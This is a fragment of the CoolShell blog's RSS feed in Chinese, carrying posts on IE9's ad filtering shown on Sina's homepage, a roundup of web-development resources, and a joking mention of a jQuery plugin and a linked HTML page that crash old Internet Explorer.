+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-150x150.jpg" alt="一次Ajax查错的经历" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a></li><li ><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/04/Green-Computing-150x150.jpg" alt="做个环保主义的程序员" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_title">做个环保主义的程序员</a></li><li ><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="10大经典错误" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_title">10大经典错误</a></li><li ><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01-150x150.png" alt="新浪微博的XSS攻击" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_title">新浪微博的XSS攻击</a></li><li ><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/03/affc-image1-150x150.png" alt="微软用新浪来当反面教材" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_title">微软用新浪来当反面教材</a></li><li ><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/09/biolab-150x150.jpg" alt="一些非常有意思的杂项资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_title">一些非常有意思的杂项资源</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/3921.html">中国仍是IE6的重灾区</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/3921.html/feed</wfw:commentRss>
+			<slash:comments>56</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>微软用新浪来当反面教材</title>
+		<link>https://coolshell.cn/articles/3872.html</link>
+					<comments>https://coolshell.cn/articles/3872.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Thu, 03 Mar 2011 00:30:49 +0000</pubDate>
+				<category><![CDATA[技术新闻]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[IE]]></category>
+		<category><![CDATA[Sina]]></category>
+		<category><![CDATA[Web]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=3872</guid>
+
+					<description><![CDATA[<p>微软的IE的Blog发布了这样一篇文章，以此来展示IE9是如何过滤广告和ActiveX控件的功能。其使用了“新浪”来做为反面案例，新浪并不是第一次成为反面案例了...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/3872.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/3872.html">微软用新浪来当反面教材</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script></p>
+<p style="text-align: left;">微软的<a href="http://blogs.msdn.com/b/ie/" target="_blank">IE的Blog</a>发布了这样<a href="http://ie.microsoft.com/testdrive/IEBlog/2011/Feb/affc-image1.png" target="_blank">一篇文章</a>，以此来展示IE9是如何过滤广告和ActiveX控件的功能。其使用了“新浪”来做为反面案例，新浪并不是第一次成为反面案例了，之前就有人用新浪等网站来表明<a title="为什么中国的网页设计那么烂？" href="https://coolshell.cn/articles/3605.html" target="_blank">中国的网站的设计是怎么个烂法</a>。呵呵。伟大的新浪。</p>
+<p>下面是新浪的在IE9下没有开启过滤的样子，我们要吧看到满天飞的flash，广告，还有视频……</p>
+<div class="mceTemp mceIEcenter" style="text-align: left;">
+<dl class="wp-caption aligncenter" style="width: 575px;">
+<dt class="wp-caption-dt"><a href="http://ie.microsoft.com/testdrive/IEBlog/2011/Feb/affc-image1.png"><img decoding="async" loading="lazy" class="  " title="新浪网站没有使用IE9的过滤功能" src="http://ie.microsoft.com/testdrive/IEBlog/2011/Feb/affc-image1.png" alt="新浪网站没有使用IE9的过滤功能" width="565" height="411" /></a></dt>
+<dd class="wp-caption-dd">新浪网站没有使用IE9的过滤功能</dd>
+</dl>
+</div>
+<p style="text-align: left;">下面是开启了过滤功能后的新浪网页（个人感觉还是那么乱，没办法底子太差了）</p>
+<p style="text-align: left;"><span id="more-3872"></span></p>
+<figure style="width: 565px" class="wp-caption aligncenter"><a href="http://ie.microsoft.com/testdrive/IEBlog/2011/Feb/affc-image2.png"><img decoding="async" loading="lazy" class="  " title="IE9开启了ActiveX过滤功能后的新浪网页" src="http://ie.microsoft.com/testdrive/IEBlog/2011/Feb/affc-image2.png" alt="IE9开启了ActiveX过滤功能后的新浪网页" width="565" height="411" /></a><figcaption class="wp-caption-text">IE9开启了ActiveX过滤功能后的新浪网页</figcaption></figure>
+<p>(全文完)<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-150x150.jpg" alt="一次Ajax查错的经历" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a></li><li ><a href="https://coolshell.cn/articles/5247.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg" alt="国内微博和Twitter的最大不同" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5247.html" class="wp_rp_title">国内微博和Twitter的最大不同</a></li><li ><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01-150x150.png" alt="新浪微博的XSS攻击" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_title">新浪微博的XSS攻击</a></li><li ><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/09/biolab-150x150.jpg" alt="一些非常有意思的杂项资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_title">一些非常有意思的杂项资源</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png" alt="如何免费的让网站启用HTTPS" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/3872.html">微软用新浪来当反面教材</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/3872.html/feed</wfw:commentRss>
+			<slash:comments>28</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>一些非常有意思的杂项资源</title>
+		<link>https://coolshell.cn/articles/3013.html</link>
+					<comments>https://coolshell.cn/articles/3013.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 28 Sep 2010 00:38:34 +0000</pubDate>
+				<category><![CDATA[Ajax开发]]></category>
+		<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Unix/Linux]]></category>
+		<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[技术读物]]></category>
+		<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[AJAX]]></category>
+		<category><![CDATA[CSS]]></category>
+		<category><![CDATA[ebook]]></category>
+		<category><![CDATA[Flash]]></category>
+		<category><![CDATA[Go]]></category>
+		<category><![CDATA[GUI]]></category>
+		<category><![CDATA[HTML]]></category>
+		<category><![CDATA[IE]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Structure Synth]]></category>
+		<category><![CDATA[UI]]></category>
+		<category><![CDATA[vi]]></category>
+		<category><![CDATA[vim]]></category>
+		<category><![CDATA[Web]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=3013</guid>
+
+					<description><![CDATA[<p>下面是一些最近在互联网上看到的一些各式各样的资源和文章，当然，都是英文社区的，本来想每一个写一篇文章，但是觉得一篇文章一句话真没劲，所以，把这些东西合并写成一篇...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/3013.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/3013.html">一些非常有意思的杂项资源</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>下面是一些最近在互联网上看到的一些各式各样的资源和文章，当然，都是英文社区的，本来想每一个写一篇文章，但是觉得一篇文章一句话真没劲，所以，把这些东西合并写成一篇文章，这样有利于减轻本站的负载，也有利于节省网络带宽，同样，也就节省了能力和电力，因此也就很环保，很低碳。呵呵。</p>
+<ul>
+<li>先是一个《Windows Internal》第五版的第五章的电子版（英文的），你可以在<a href="http://download.sysinternals.com/Files/WindowsInternals-Ch05.pdf" target="_blank"><strong>这里下载</strong></a>。关于其它一些电子书，你可以看看本站的这篇文章《<a rel="bookmark" href="https://coolshell.cn/articles/2775.html" target="_blank">免费电子书列表</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/240.html">非常不错的编程技术教程</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/336.html">超过100本的linux免费书籍</a>》和《<a rel="bookmark" href="https://coolshell.cn/articles/355.html">20本最好的Linux免费书籍</a>》</li>
+</ul>
+<p><span style="color: #ffffff;">→</span></p>
+<ul>
+<li><a href="http://www.3dtin.com/" target="_blank"><strong>http://www.3dtin.com/</strong></a>是一个用纯Javascript搞的一个3D作图的网站，Javascript是越来越强大了。这个演示可以让你看到以后Web应用的潜力。关于<a href="https://coolshell.cn/articles/tag/javascript" target="_blank">Javascript的一些东西</a>，你可以参看本站的这些文章《<a rel="bookmark" href="https://coolshell.cn/articles/2785.html" target="_blank">JS1K 演示</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/2276.html" target="_blank">又一个Javascript试验田</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/2065.html" target="_blank">一个Windows 3.1的Web网站</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/1932.html" target="_blank">哥是玩程序的</a>》。</li>
+</ul>
+<p><span style="color: #ffffff;">→</span></p>
+<ul>
+<li>说到这些很酷很炫的东西，大家一定会想到使用Flash，不过，目前的<a href="https://coolshell.cn/articles/2735.html" target="_blank">Flash正在受到HTML5的强力挑战</a>，目前，对于HTML5的展示网站很多，让我们看到了HTML5完全可以做出Flash的样子，比如前些天本站说到的<a href="https://coolshell.cn/articles/2926.html" target="_blank">这个演示</a>，还有给大家展示的<a href="https://coolshell.cn/articles/2998.html" target="_blank">纯HTML5的小游戏</a>，不过，那些都是一些演示和展示罢了。今天在网上看到一个更强大的HTML5游戏，相当有可玩性，大家不妨一去试玩：<strong><a href="http://www.phoboslab.org/biolab/" target="_blank">http://www.phoboslab.org/biolab/</a></strong></li>
+</ul>
+<p><a href="http://www.phoboslab.org/biolab/"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-3017" title="一个很不错的HTML5游戏" src="https://coolshell.cn/wp-content/uploads/2010/09/biolab.jpg" alt="" width="483" height="321" srcset="https://coolshell.cn/wp-content/uploads/2010/09/biolab.jpg 483w, https://coolshell.cn/wp-content/uploads/2010/09/biolab-300x199.jpg 300w, https://coolshell.cn/wp-content/uploads/2010/09/biolab-406x270.jpg 406w" sizes="(max-width: 483px) 100vw, 483px" /></a></p>
+<p><span style="color: #ffffff;">→</span></p>
+<ul>
+<li>HTML5 可以应用的还不只是游戏，这不，<a href="http://thechangelog.com/post/1097381443/vexflow-html5-canvas-javascript-library-music-and-guitar" target="_blank">有文章指出</a>，用<a href="http://www.vexflow.com/" target="_blank"><strong>VexFlow</strong></a>还可以很轻松地在网页上发布乐谱。而<a href="http://stepheneisenhauer.com/demos/drummachine/" target="_blank"><strong>这个网页</strong></a>还可以让你制作Hi-PoP音乐。</li>
+</ul>
+<p style="text-align: center;"><a href="http://www.vexflow.com/"><img decoding="async" loading="lazy" src="http://cl.ly/c4f966c6d51cfc9be20b/content" alt="Rendered music" width="530" height="240" /></a></p>
+<p><span style="color: #ffffff;">→</span></p>
+<ul>
+<li>说到Web开发，就得要提CSS了，这里有一个在线编辑CSS的网站，很不错，<a href="http://css3.mikeplate.com/" target="_blank"><strong>http://css3.mikeplate.com/</strong></a>。关于CSS和Web开发的一些文章，你可以查看本站的<a href="https://coolshell.cn/articles/tag/css" target="_blank">CSS的Tag</a>。现在，这种在线的东西是越来越多了，比如：《<a rel="bookmark" href="https://coolshell.cn/articles/2271.html" target="_blank">Emacs配色在线生成器</a><span style="font-weight: normal; font-size: 13px;">》、《</span><a rel="bookmark" href="https://coolshell.cn/articles/1883.html" target="_blank">Coderun.com 在线开发IDE</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/1830.html" target="_blank">正则表达式生成器</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/1611.html" target="_blank">Ajax开发利器UIzard</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/776.html" target="_blank">一个在线的画UML图的网站</a>》。</li>
+</ul>
+<p><span id="more-3013"></span></p>
+<p><span style="color: #ffffff;">→</span></p>
+<ul>
+<li>说起在线服务，就不得不说说在线代码编译的服务，我觉得这种服务相当好，不需要你在本机安装编译器或IDE，想试试某个语言的语法，真接上网就OK，很方便。以前本站向大家介绍过《<a rel="bookmark" href="https://coolshell.cn/articles/1310.html" target="_blank">在线代码编译服务Codepad.org</a>》其支持：C，C++，D，Haskell，Lua，OCaml，PHP，Perl，Plain Text，Python，Ruby，Scheme，Tcl。当然，在这里，向你介绍一个可以运行Go语言的：<strong><a href="http://golang.org/doc/play/" target="_blank">http://golang.org/doc/play/</a></strong></li>
+</ul>
+<p><span style="color: #ffffff;">→</span></p>
+<ul>
+<li>说起Web开发，很自然的就能想到UI。下面是一个<a href="http://designingwebinterfaces.com/designing-web-interfaces-12-screen-patterns" target="_blank"><strong>UI的设计Patterns</strong></a>，这篇文章告诉了我们12个比较常用或是经典的图形UI Patterns。关于<a href="https://coolshell.cn/articles/tag/ui" target="_blank">UI方面的话题</a>，你可以参看酷壳的《<a rel="bookmark" href="https://coolshell.cn/articles/363.html" target="_blank">35个强大的UI设计教程</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/1907.html" target="_blank">UI的恶梦</a>》和《<a rel="bookmark" href="https://coolshell.cn/articles/2313.html" target="_blank">史上最糟糕的网站</a>》。</li>
+</ul>
+<p><a href="http://designingwebinterfaces.com/designing-web-interfaces-12-screen-patterns"><img decoding="async" loading="lazy" class="aligncenter" title="12个标准的图形UI设计模式" src="http://theresaneil.files.wordpress.com/2008/12/standard_screen_patterns.png" alt="" width="476" height="705" /></a></p>
+<p><span style="color: #ffffff;">→</span></p>
+<ul>
+<li>说起Web的界面，最让各位WEB开发者痛苦的就是网页兼容性问题，IE是一个恶梦，因为其自己和自己都不兼容，在MSDN上，有这样的一个网页说明了<a href="http://msdn.microsoft.com/en-us/library/cc351024" target="_blank"><strong>从IE5一直到IE9的CSS的兼容性问题</strong></a>，很多很多的表格，头都看大了。当然，以前本站的《<a rel="bookmark" href="https://coolshell.cn/articles/757.html" target="_blank">检查网页浏览器的兼容性</a>》的文章向你介绍过如何查看网站在不同浏览器中和操作系统下的效果（其也是一个在线服务）。</li>
+</ul>
+<p><span style="color: #ffffff;">→</span></p>
+<ul>
+<li>当然，Web上的开发，问题最大的还是安全问题，我们的Ruby on Rails给出了一个<a href="http://guides.rubyonrails.org/security.html" target="_blank"><strong>Web安全的开发教程</strong></a>，相当不错哦。谈到了几乎所有最有威胁和最常用的网上攻击，这个文档应该是所有Web开发者都需要注意的。</li>
+</ul>
+<p><span style="color: #ffffff;">→</span></p>
+<ul>
+<li>下面是一个给新手学习linux用的一个桌面（点击图片看大图），其列出了很多常用的命令，以及VI的常用命令。关于VI的一些东西，你可以查看<a href="https://coolshell.cn/articles/tag/vim" target="_blank">本站的这些文章</a>，如：<a rel="bookmark" href="https://coolshell.cn/articles/1651.html" target="_blank">VIM有趣的命令</a>、<a rel="bookmark" href="https://coolshell.cn/articles/894.html" target="_blank">如何在vim中得到你最喜爱的IDE特性</a></li>
+</ul>
+<p style="text-align: center;"><a href="http://i.imgur.com/CJkR9.png"><img decoding="async" loading="lazy" class="aligncenter" title="Linux命令桌面" src="http://i.imgur.com/CJkR9.png" alt="" width="553" height="346" /></a></p>
+<p><span style="color: #ffffff;">→</span></p>
+<ul>
+<li>最后，给大家介绍一个关于文件格式方面东西，我们知道，很多文件的开头表明着这个文件的类型，所以，有这样的一个网站了维护了这么一个信息列表，其把几乎所有常见的文件头的那段和文件类型相关的Magic Number列了出来，而且还保持更新，非常不错哦，这个网站是：<strong><a href="http://www.garykessler.net/library/file_sigs.html">http://www.garykessler.net/library/file_sigs.html</a><span style="font-weight: normal;">，希望能对你有用哦。</span></strong></li>
+</ul>
+<p><span style="color: #ffffff;">→</span></p>
+<ul>
+<li><strong><span style="font-weight: normal;">最最后，给大家介绍一个开源项目，叫<a href="http://structuresynth.sourceforge.net/" target="_blank"><strong>Structure Synth</strong></a>，这个东西可以用来画出一些很酷的图，相当不错，使用起来非常简单，我试用了一下，的确很强大。用一些简单的脚本就可以作出很不错的3D图，下面是他的一个示例，只需要写那么不到10行的代码，很简单。</span></strong></li>
+</ul>
+<p><a href="http://structuresynth.sourceforge.net/index.php"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-3018" title="Structure Synth" src="https://coolshell.cn/wp-content/uploads/2010/09/Structure-Synth.jpg" alt="" width="500" height="301" srcset="https://coolshell.cn/wp-content/uploads/2010/09/Structure-Synth.jpg 500w, https://coolshell.cn/wp-content/uploads/2010/09/Structure-Synth-300x180.jpg 300w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p style="padding-left: 60px;">想看看，大家用这个东西做什么酷图了吗？上 <a href="http://www.flickr.com/groups/structuresynth/" target="_blank">http://www.flickr.com/groups/structuresynth/</a> 看看吧。</p>
+<p id="pool_4652540301" style="text-align: center;"><a title="structure 作者 Supreet Kumar" href="http://www.flickr.com/photos/9857764@N02/4652540301/in/pool-structuresynth"><img decoding="async" loading="lazy" src="http://farm5.static.flickr.com/4029/4652540301_db50832fdc_t.jpg" border="0" alt="structure 作者 Supreet Kumar" width="100" height="56" /></a> <a title="architecture x-ray 2 作者 Supreet Kumar" href="http://www.flickr.com/photos/9857764@N02/4652540021/in/pool-structuresynth"><img decoding="async" loading="lazy" src="http://farm5.static.flickr.com/4044/4652540021_0f17294ca5_t.jpg" border="0" alt="architecture x-ray 2 作者 Supreet Kumar" width="100" height="62" /></a> <a title="perspective 作者 Supreet Kumar" href="http://www.flickr.com/photos/9857764@N02/4650270228/in/pool-structuresynth"><img decoding="async" loading="lazy" src="http://farm5.static.flickr.com/4002/4650270228_8cc69948bc_t.jpg" border="0" alt="perspective 作者 Supreet Kumar" width="100" height="60" /></a> <a title="snake shade 作者 Supreet Kumar" href="http://www.flickr.com/photos/9857764@N02/4649663253/in/pool-structuresynth"><img decoding="async" loading="lazy" src="http://farm5.static.flickr.com/4042/4649663253_aa041ab239_t.jpg" border="0" alt="snake shade 作者 Supreet Kumar" width="100" height="57" /></a> <a title="thatched beauty 作者 Supreet Kumar" href="http://www.flickr.com/photos/9857764@N02/4641732162/in/pool-structuresynth"><img decoding="async" loading="lazy" src="http://farm4.static.flickr.com/3414/4641732162_e2b078825f_t.jpg" border="0" alt="thatched beauty 作者 Supreet Kumar" width="100" height="63" /></a><br />
+<a title="aircraft 作者 Supreet Kumar" href="http://www.flickr.com/photos/9857764@N02/4641055399/in/pool-structuresynth"><img decoding="async" loading="lazy" src="http://farm4.static.flickr.com/3353/4641055399_25688820a9_t.jpg" border="0" alt="aircraft 作者 Supreet Kumar" width="100" height="70" /></a> <a title="aircraft 作者 Supreet Kumar" href="http://www.flickr.com/photos/9857764@N02/4641055019/in/pool-structuresynth"><img decoding="async" loading="lazy" src="http://farm5.static.flickr.com/4064/4641055019_6ed80cd1b9_t.jpg" border="0" alt="aircraft 作者 Supreet Kumar" width="100" height="65" /></a> <a title=" 作者 FracturedPixel" href="http://www.flickr.com/photos/cav666/4640849748/in/pool-structuresynth"><img decoding="async" loading="lazy" src="http://farm5.static.flickr.com/4062/4640849748_0532451842_t.jpg" border="0" alt=" 作者 FracturedPixel" width="100" height="63" /></a> <a title="splash1 作者 Supreet Kumar" href="http://www.flickr.com/photos/9857764@N02/4636427318/in/pool-structuresynth"><img decoding="async" loading="lazy" src="http://farm5.static.flickr.com/4008/4636427318_c84acf4aa4_t.jpg" border="0" alt="splash1 作者 Supreet Kumar" width="100" height="63" /></a> <a title="joy 作者 Supreet Kumar" href="http://www.flickr.com/photos/9857764@N02/4635820649/in/pool-structuresynth"><img decoding="async" loading="lazy" src="http://farm5.static.flickr.com/4012/4635820649_720cd6599b_t.jpg" border="0" alt="joy 作者 Supreet Kumar" width="100" height="53" /></a></p>
+<p id="pool_4635820649">（全文完）</p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/3903.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/14.jpg" alt="一些有意思的贴子和工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3903.html" class="wp_rp_title">一些有意思的贴子和工具</a></li><li ><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg" alt="Web开发人员速查卡" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a></li><li ><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/05/Render-Process-150x150.jpg" alt="浏览器的渲染原理简介" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_title">浏览器的渲染原理简介</a></li><li ><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-150x150.jpg" alt="一次Ajax查错的经历" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a></li><li ><a href="https://coolshell.cn/articles/6840.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/03/css-layouts-150x150.gif" alt="CSS 布局:40个教程、技巧、例子和最佳实践" width="150" height="150" /></a><a href="https://coolshell.cn/articles/6840.html" class="wp_rp_title">CSS 布局:40个教程、技巧、例子和最佳实践</a></li><li ><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/09/image008-150x150.jpg" alt="一些文章和各种资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_title">一些文章和各种资源</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/3013.html">一些非常有意思的杂项资源</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/3013.html/feed</wfw:commentRss>
+			<slash:comments>45</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>一个jQuery的插件</title>
+		<link>https://coolshell.cn/articles/2357.html</link>
+					<comments>https://coolshell.cn/articles/2357.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Wed, 14 Apr 2010 05:42:36 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[IE]]></category>
+		<category><![CDATA[jQuery]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=2357</guid>
+
+					<description><![CDATA[<p>jQuery这个强大的玩意我就不多说了，不知道可以上网搜搜看。IE6我也不多说了，这可能是史上骂名最多的一个浏览器，网上有N多的声讨IE6的文章，你也可以参看本...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/2357.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/2357.html">一个jQuery的插件</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>jQuery这个强大的玩意我就不多说了，不知道可以上网搜搜看。IE6我也不多说了，这可能是史上骂名最多的一个浏览器，网上有N多的声讨IE6的文章，你也可以参看本站的《<a rel="bookmark" href="https://coolshell.cn/articles/1817.html">9个最常见IE的Bug及其fix</a>》和《<a rel="bookmark" href="https://coolshell.cn/articles/1245.html">IE的CSS相关的BUG</a>》，如果你今天还在用IE6，或是IE类浏览器，那请让我小小的BS你一下。</p>
+<p>这个jQuery的Plugin可能是有史以来所有plugin中最有个性的一个，因为这个plugin什么也不干，其会用户的IE6版的浏览器直接Crash掉。这个plugin叫jQuery Crash，其网页链接在下面，是一个四星级的插件，仅仅435个字节。</p>
+<p style="text-align: center;"><a href="http://plugins.jquery.com/project/crash" target="_blank">http://plugins.jquery.com/project/crash</a></p>
+<p style="text-align: left;">其是这样介绍自己的，有脏话，我就不翻译了。</p>
+<blockquote><p>A jQuery plugin for crashing IE6. That&#8217;ll teach those motherf!%@*#s to upgrade their s#*t.</p></blockquote>
+<p>其它，让IE系例的浏览器挂掉，并不需要Javascript，你可以尝试点击下面这个页面，这是一个纯HTML的页面，没有任何的CSS，或是JS的东西，只有HTML。请小心打开（如果在Firefox中打开也可能会挂，Chrome中没事）</p>
+<p style="text-align: center;"><a href="http://www.gregmerideth.net/html/iecrash.html" target="_blank">http://www.gregmerideth.net/html/iecrash.html</a></p>
+<p>这个纯HTML的来源是本来是作者写了一个程序生成了一个N层嵌套的表格，结果在IE5中导致了IE5不响应直到Crash并使用了100%的CPU资源，这么多年过去了，还是老样子，在我的dual-core+IE7上，也是一样，占了50%的CPU，而且还有很高的内核使用，最后只能把进程给kill了。BT啊，纯HTML都会让IE这样。<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
